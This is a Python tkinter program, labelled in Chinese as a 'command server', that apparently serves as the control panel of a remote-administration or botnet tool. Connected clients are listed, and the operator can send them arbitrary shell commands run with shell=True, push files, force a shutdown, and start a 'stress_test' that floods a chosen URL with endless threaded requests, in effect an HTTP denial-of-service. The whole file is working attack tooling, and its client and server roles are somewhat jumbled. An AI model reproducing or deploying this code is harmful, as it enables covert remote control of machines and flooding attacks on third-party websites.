import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, simpledialog, Listbox, filedialog
import subprocess
import os
import requests
import shutil
import tkinter.ttk as ttk
clients = []

def send_command(command, client_socket):
    client_socket.send(command.encode())
    response = client_socket.recv(4096).decode()
    return response

def handle_client(client_socket):
    clients.append(client_socket)
    client_address = client_socket.getpeername()
    client_listbox.insert(tk.END, f"{client_address[0]}:{client_address[1]}")

    while True:
        command = client_socket.recv(1024).decode()
        if not command:
            break
        response = run_command(command)
        client_socket.send(response.encode())
    clients.remove(client_socket)
    client_listbox.delete(tk.END)
    client_socket.close()

def run_command(command):
    if command.startswith("stress_test"):
        url = command.split(" ")[1]
        stress_test(url)
        return "Stress test started"
    elif command == "shutdown":
        os.system("shutdown /s /t 1")
        return "Shutting down"
    else:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr

def stress_test(url):
    def request_thread(url):
        while True:
            try:
                response = requests.get(url)
                print(f"Response status: {response.status_code}")
            except:
                print("Request failed")

    num_threads = 10
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=request_thread, args=(url,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def start_server():
    host = '0.0.0.0'  # 监听所有可用的IP地址
    port = 12345      # 选择一个端口

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    log_text.insert(tk.END, f"服务器正在监听 {host}:{port}\n")

    while True:
        client_socket, addr = server_socket.accept()
        log_text.insert(tk.END, f"连接来自 {addr}\n")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

def on_send_click():
    selected_index = client_listbox.curselection()
    if not selected_index:
        log_text.insert(tk.END, "请选择一个客户端\n")
        return

    command = command_entry.get()
    client_socket = clients[selected_index[0]]
    response = send_command(command, client_socket)
    log_text.insert(tk.END, f"命令: {command}\n响应: {response}\n")

def on_stress_test_click():
    selected_index = client_listbox.curselection()
    if not selected_index:
        log_text.insert(tk.END, "请选择一个客户端\n")
        return

    url = simpledialog.askstring("输入", "请输入要压测的URL:")
    if url:
        command = f"stress_test {url}"
        client_socket = clients[selected_index[0]]
        response = send_command(command, client_socket)
        log_text.insert(tk.END, f"命令: {command}\n响应: {response}\n")

def on_send_file_click():
    selected_index = client_listbox.curselection()
    if not selected_index:
        log_text.insert(tk.END, "请选择一个客户端\n")
        return

    file_path = filedialog.askopenfilename()
    if not file_path:
        return

    client_socket = clients[selected_index[0]]
    send_file(file_path, client_socket)

def send_file(file_path, client_socket):
    file_name = os.path.basename(file_path)
    file_size = os.path.getsize(file_path)

    client_socket.send(f"send_file {file_name} {file_size}".encode())
    with open(file_path, 'rb') as file:
        while True:
            file_data = file.read(4096)
            if not file_data:
                break
            client_socket.send(file_data)
    log_text.insert(tk.END, f"文件 {file_name} 已发送\n")

# 创建主窗口
root = tk.Tk()
root.title("命令服务器")
root.configure(bg="#f0f0f0")

# 使用ttk的样式设置
style = ttk.Style()
style.theme_use('clam')
style.configure("TButton", foreground="black", background="#4CAF50", font=("Helvetica", 12))
style.map("TButton", background=[("active", "#45a049")])
style.configure("TLabel", foreground="black", background="#f0f0f0", font=("Helvetica", 12))
style.configure("TEntry", foreground="black", background="white", font=("Helvetica", 12))

# 创建客户端列表框
client_listbox = Listbox(root, width=30, height=20, font=("Helvetica", 12))
client_listbox.grid(row=0, column=0, rowspan=4, padx=10, pady=10)

# 创建输入框和标签
tk.Label(root, text="命令:", bg="#f0f0f0", font=("Helvetica", 12)).grid(row=0, column=1, padx=10, pady=5)
command_entry = ttk.Entry(root, width=50)
command_entry.grid(row=0, column=2, padx=10, pady=5)

# 创建发送按钮
send_button = ttk.Button(root, text="发送命令", command=on_send_click)
send_button.grid(row=0, column=3, padx=10, pady=5)

# 创建压测按钮
stress_test_button = ttk.Button(root, text="压测", command=on_stress_test_click)
stress_test_button.grid(row=1, column=3, padx=10, pady=5)

# 创建发送文件按钮
send_file_button = ttk.Button(root, text="发送文件", command=on_send_file_click)
send_file_button.grid(row=2, column=3, padx=10, pady=5)

# 创建日志文本框
log_text = scrolledtext.ScrolledText(root, width=80, height=20, font=("Helvetica", 12))
log_text.grid(row=3, column=1, columnspan=3, padx=10, pady=10)

# 启动服务器线程
server_thread = threading.Thread(target=start_server)
server_thread.start()

# 运行主循环
root.mainloop()
